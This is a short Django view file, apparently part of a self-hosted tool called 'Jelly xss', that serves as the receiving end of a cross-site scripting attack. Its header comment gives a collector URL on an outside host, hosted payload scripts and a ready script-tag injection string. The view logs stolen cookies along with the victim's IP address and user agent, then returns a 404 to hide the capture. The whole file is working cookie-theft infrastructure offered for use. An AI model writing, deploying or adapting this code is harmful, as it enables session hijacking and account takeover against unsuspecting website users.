#!/usr/bin/python
# -*- coding: utf-8 -*-

'''
Jelly xss
接口
http://ice.box/plug/xss/?xss=

xss.js
http://ice.box/static/js/xss.js
http://ice.box/static/js/x.js

科学的插入姿势
<script src="http://ice.box/static/js/x.js"></script>
'''

from django.shortcuts import render_to_response
from django.http import Http404
from django.http import HttpResponse
from django.http import HttpResponseRedirect
from django.template import RequestContext
# from django.views.decorators.csrf import csrf_protect
from django.core.context_processors import csrf
from plug.models import *

def xss(request):
    if request.method == 'GET':
        cookie = request.GET['xss']
        if request.META.has_key('HTTP_X_FORWARDED_FOR'):  
            ip =  request.META['HTTP_X_FORWARDED_FOR']  
        else:  
            ip = request.META['REMOTE_ADDR']
        agent = request.META.get('HTTP_USER_AGENT')
        cookie = cookie + '__IP:' + ip + '__agent:' + agent
        s = Xss(cookie=cookie)
        s.save()
        raise Http404
    else:
        raise Http404
